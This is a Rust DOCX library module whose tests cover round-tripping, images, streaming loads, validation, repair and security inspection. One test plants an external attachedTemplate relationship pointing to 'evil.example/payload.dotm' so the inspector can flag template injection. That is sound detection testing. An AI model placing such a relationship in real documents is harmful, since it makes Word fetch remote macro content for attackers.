//! Pure-Rust ECMA-376 Microsoft Word (`.docx`) OpenXML Reader & Writer
//! supporting Track Changes (`<w:ins>`/`<w:del>`), Threaded Comments (`word/comments.xml`),
//! Security Classifications, and Lossless Enterprise ZIP Passthrough.

pub mod intelligence;
pub mod reader;
pub mod writer;
pub mod xml_lite;

pub use intelligence::{
    inspect_formatting_consistency, inspect_security_and_hidden, repair_docx_bytes,
    repair_docx_file, validate_docx_bytes, validate_docx_file, ConsistencyFinding,
    DocxRepairReport, DocxValidationReport, IssueSeverity, SecurityFinding,
    SecurityInspectionReport, ValidationFinding,
};
pub use reader::{load_docx_bytes, load_docx_file, load_docx_shared_with_progress};
pub use writer::{save_docx_bytes, save_docx_file};

#[derive(Debug, Clone)]
pub struct DocxError(pub String);

impl std::fmt::Display for DocxError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "DocxError: {}", self.0)
    }
}

impl std::error::Error for DocxError {}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::xml_lite::parse_xml;
    use doc_model::{Block, SecurityClassification, TemplateKind};

    #[test]
    fn test_docx_welcome_roundtrip() {
        let original = TemplateKind::WelcomeGuide.build();
        let bytes = save_docx_bytes(&original);
        assert!(bytes.len() > 800);

        let parsed = load_docx_bytes(&bytes).expect("parse generated docx");
        assert_eq!(parsed.title, "Welcome to RustPad");
        assert_eq!(parsed.author, "Nour Yahyaoui");
        assert_eq!(parsed.classification, SecurityClassification::Internal);
        let has_table = parsed.blocks.iter().any(|b| matches!(b, Block::Table(_)));
        assert!(has_table, "expected round-tripped table block");
        let plain = parsed.to_plain_text();
        assert!(plain.contains("RustPad Document & PDF Studio"));
        assert_eq!(parsed.comments.len(), 1);
    }

    #[test]
    fn test_enterprise_track_changes_comments_and_passthrough_roundtrip() {
        let mut contract = TemplateKind::EnterpriseContract.build();
        contract.passthrough_parts.insert(
            "customXml/item1.xml".into(),
            b"<enterprisePolicy org=\"SovereignLab\"/>".to_vec(),
        );
        contract.passthrough_parts.insert(
            "word/theme/theme1.xml".into(),
            b"<a:theme name=\"CorporateLinen\"/>".to_vec(),
        );

        let bytes = save_docx_bytes(&contract);
        let parsed = load_docx_bytes(&bytes).expect("parse enterprise contract docx");

        assert!(parsed.track_changes);
        assert_eq!(parsed.classification, SecurityClassification::Confidential);
        let (ins, del) = parsed.revision_counts();
        assert!(ins >= 2, "expected round-tripped <w:ins> revisions");
        assert!(del >= 1, "expected round-tripped <w:del> revisions");
        assert_eq!(parsed.comments.len(), 2);
        assert_eq!(
            parsed
                .passthrough_parts
                .get("customXml/item1.xml")
                .map(|v| v.as_slice()),
            Some(&b"<enterprisePolicy org=\"SovereignLab\"/>"[..])
        );
        assert!(parsed.passthrough_parts.contains_key("word/theme/theme1.xml"));
    }

    #[test]
    fn test_xml_depth_limit_rejects_adversarial_nesting() {
        let mut deep = String::new();
        for _ in 0..200 {
            deep.push_str("<n>");
        }
        for _ in 0..200 {
            deep.push_str("</n>");
        }
        assert!(parse_xml(&deep).is_none());
    }

    #[test]
    fn test_jpeg_and_png_image_roundtrip_with_full_drawingml() {
        let mut doc = doc_model::Document::blank();
        let mut jpg_img = doc_model::ImageBlock::new(
            "Quarterly Chart",
            360.0,
            220.0,
            vec![0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, b'J', b'F', b'I', b'F'],
        );
        jpg_img.caption = "Figure 1: Revenue trajectory".into();
        jpg_img.alignment = doc_model::Alignment::Right;
        doc.blocks.push(Block::Image(jpg_img));

        let bytes = save_docx_bytes(&doc);
        let archive = rustpad_zip::ZipArchive::from_bytes(&bytes).expect("open saved docx zip");
        assert!(
            archive.get("word/media/image1.jpeg").is_some(),
            "JPEG payload must use .jpeg media extension"
        );
        let doc_xml = archive.get_str("word/document.xml").expect("document.xml");
        assert!(doc_xml.contains("<pic:nvPicPr>"));
        assert!(doc_xml.contains("<pic:spPr>"));

        let parsed = load_docx_bytes(&bytes).expect("reload saved image docx");
        let loaded_img = parsed
            .blocks
            .iter()
            .find_map(|b| match b {
                Block::Image(i) => Some(i),
                _ => None,
            })
            .expect("expected reloaded Block::Image");
        assert_eq!(loaded_img.name, "Quarterly Chart");
        assert_eq!(loaded_img.caption, "Figure 1: Revenue trajectory");
        assert_eq!(loaded_img.alignment, doc_model::Alignment::Right);
        assert!((loaded_img.width_pt - 360.0).abs() < 0.5);
        assert!((loaded_img.height_pt - 220.0).abs() < 0.5);
    }

    #[test]
    fn test_alternate_content_vml_pict_and_mixed_paragraph_images() {
        let mut zw = rustpad_zip::ZipWriter::new();
        zw.add_file(
            "word/_rels/document.xml.rels",
            br#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId10" Target="/word/media/photo1.jpg"/>
  <Relationship Id="rId11" Target="media/vml_diag.png"/>
</Relationships>"#
                .to_vec(),
        );
        zw.add_file("word/media/photo1.jpg", vec![0xFF, 0xD8, 0xFF, 0xD9]);
        zw.add_file(
            "word/media/vml_diag.png",
            vec![137, 80, 78, 71, 13, 10, 26, 10],
        );
        zw.add_file(
            "word/document.xml",
            br#"<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
  xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
  xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"
  xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
  xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture"
  xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
  xmlns:v="urn:schemas-microsoft-com:vml"
  xmlns:o="urn:schemas-microsoft-com:office:office">
  <w:body>
    <w:p>
      <w:r><w:t>Inline lead-in text</w:t></w:r>
      <w:r>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor>
                <wp:extent cx="3810000" cy="1905000"/>
                <wp:docPr id="1" name="Anchored Photo" descr="Alt caption"/>
                <a:graphic><a:graphicData><pic:pic><pic:blipFill><a:blip r:embed="rId10"/></pic:blipFill></pic:pic></a:graphicData></a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict><v:shape style="width:300pt;height:150pt"><v:imagedata r:id="rId10"/></v:shape></w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:pict>
          <v:shape style="width:240pt;height:120pt">
            <v:imagedata r:id="rId11" o:title="Legacy VML Diagram"/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
  </w:body>
</w:document>"#
                .to_vec(),
        );

        let parsed = load_docx_bytes(&zw.finish()).expect("parse AlternateContent + VML docx");
        assert!(parsed.to_plain_text().contains("Inline lead-in text"));
        let imgs: Vec<&doc_model::ImageBlock> = parsed
            .blocks
            .iter()
            .filter_map(|b| match b {
                Block::Image(i) => Some(i),
                _ => None,
            })
            .collect();
        assert_eq!(imgs.len(), 2, "must extract Choice drawing once + VML pict");
        assert_eq!(imgs[0].name, "Anchored Photo");
        assert_eq!(imgs[0].caption, "Alt caption");
        assert!((imgs[0].width_pt - 300.0).abs() < 1.0);
        assert_eq!(imgs[1].name, "Legacy VML Diagram");
        assert!((imgs[1].width_pt - 240.0).abs() < 1.0);
    }

    #[test]
    fn test_v24_streaming_lazy_zip_shared_media_dedup_and_word_bloat_skip() {
        let mut zw = rustpad_zip::ZipWriter::new();
        zw.add_file(
            "word/_rels/document.xml.rels",
            br#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId99" Target="media/shared_capture.png"/>
</Relationships>"#
                .to_vec(),
        );
        // Zero-copy STORED 128 KiB PNG header payload referenced TWICE in `<w:body>`
        let mut stored_png = vec![0u8; 128 * 1024];
        stored_png[..8].copy_from_slice(&[137, 80, 78, 71, 13, 10, 26, 10]);
        stored_png[8..12].copy_from_slice(&13u32.to_be_bytes());
        stored_png[12..16].copy_from_slice(b"IHDR");
        stored_png[16..20].copy_from_slice(&2560u32.to_be_bytes());
        stored_png[20..24].copy_from_slice(&1440u32.to_be_bytes());
        zw.add_stored("word/media/shared_capture.png", stored_png);

        zw.add_file(
            "word/document.xml",
            br#"<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
  xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml"
  xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"
  xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
  xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture"
  xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <w:body>
    <w:p w:rsidR="00AA1122" w14:paraId="77FF0011">
      <w:proofErr w:type="spellStart"/>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:r w:rsidRPr="00BB2233"><w:rPr><w:noProof/></w:rPr><w:t>Streamed zero-DOM paragraph</w:t></w:r>
      <w:bookmarkEnd w:id="0"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p><w:r><w:drawing><wp:inline><wp:extent cx="3810000" cy="2143125"/><wp:docPr id="1" name="Cap A"/><a:graphic><a:graphicData><pic:pic><pic:blipFill><a:blip r:embed="rId99"/></pic:blipFill></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>
    <w:p><w:r><w:drawing><wp:inline><wp:extent cx="3810000" cy="2143125"/><wp:docPr id="2" name="Cap B"/><a:graphic><a:graphicData><pic:pic><pic:blipFill><a:blip r:embed="rId99"/></pic:blipFill></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>
  </w:body>
</w:document>"#
                .to_vec(),
        );

        let raw_zip = doc_model::SharedBytes::from_vec(zw.finish());
        let mut progress_steps = 0usize;
        let doc = load_docx_shared_with_progress(raw_zip.clone(), |_done, _tot| {
            progress_steps += 1;
        })
        .expect("stream load docx");
        assert!(progress_steps >= 1);
        assert!(doc.to_plain_text().contains("Streamed zero-DOM paragraph"));

        let imgs: Vec<&doc_model::ImageBlock> = doc
            .blocks
            .iter()
            .filter_map(|b| match b {
                Block::Image(i) => Some(i),
                _ => None,
            })
            .collect();
        assert_eq!(imgs.len(), 2);
        assert_eq!(imgs[0].intrinsic_px, Some((2560, 1440)));
        // Both ImageBlocks share the exact same underlying `Arc<[u8]>` slice (zero RAM duplication!)
        assert_eq!(imgs[0].png_bytes.as_ptr(), imgs[1].png_bytes.as_ptr());
    }

    #[test]
    fn test_v30_footnotes_endnotes_hyperlinks_hidden_sections_validate_and_repair() {
        let mut doc = TemplateKind::WelcomeGuide.build();
        doc.metadata.subject = "Enterprise v3.0 Audit".into();
        doc.metadata.company = "RustPad Sovereign Lab".into();
        let fn_id = doc.add_footnote(0, "Primary archival citation footnote.", "Nour Yahyaoui");
        let en_id = doc.add_endnote(0, "Regulatory compliance endnote.", "Nour Yahyaoui");
        assert_eq!(fn_id, 1);
        assert_eq!(en_id, 1);

        // Add hyperlinked + hidden span + section break + embedded OLE passthrough
        let mut link_para = doc_model::Paragraph::new(doc_model::ParagraphStyle::Normal, "");
        let mut link_style = doc_model::SpanStyle::default();
        link_style.hyperlink = Some("https://rustpad-studio.vercel.app/".into());
        link_style.underline = true;
        let mut hidden_style = doc_model::SpanStyle::default();
        hidden_style.hidden = true;
        link_para.spans = vec![
            doc_model::TextSpan::styled("Official Studio", link_style),
            doc_model::TextSpan::styled("SECRET_INTERNAL_TOKEN", hidden_style),
        ];
        doc.blocks.push(Block::Paragraph(link_para));
        doc.blocks
            .push(Block::SectionBreak(doc_model::SectionBreakKind::NextPage));
        doc.extra_relationships.push(doc_model::RawRelationship {
            id: "rIdEvilTemplate".into(),
            rel_type: "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate".into(),
            target: "https://evil.example/payload.dotm".into(),
            target_mode: Some("External".into()),
        });
        doc.passthrough_shared.insert(
            "word/embeddings/oleObject1.bin".into(),
            doc_model::SharedBytes::from_slice(&[0xD0, 0xCF, 0x11, 0xE0, 1, 2, 3, 4]),
        );

        let bytes = save_docx_bytes(&doc);
        let v_rep = validate_docx_bytes(&bytes);
        assert!(v_rep.is_valid, "expected valid v3.0 package: {:?}", v_rep.findings);

        let round = load_docx_bytes(&bytes).expect("roundtrip v3.0 docx");
        assert_eq!(round.footnotes.len(), 1);
        assert_eq!(round.endnotes.len(), 1);
        assert_eq!(round.metadata.company, "RustPad Sovereign Lab");
        assert!(round
            .passthrough_shared
            .contains_key("word/embeddings/oleObject1.bin")
            || round
                .passthrough_parts
                .contains_key("word/embeddings/oleObject1.bin"));

        let sec = inspect_security_and_hidden(&round, Some(&bytes));
        assert!(sec.hidden_runs_count >= 1);
        assert!(sec.has_embedded_ole);
        assert!(sec.has_external_template_injection);

        // Corrupt the EOCD & Central Directory tail and verify `repair_docx_bytes` salvages it!
        let truncated = &bytes[..bytes.len() - 48];
        assert!(!validate_docx_bytes(truncated).is_valid);
        let (repaired_bytes, repair_rep) =
            repair_docx_bytes(truncated).expect("salvage & repair truncated docx");
        assert!(repair_rep.recovered_paragraphs >= 3);
        assert!(validate_docx_bytes(&repaired_bytes).is_valid);
    }
}
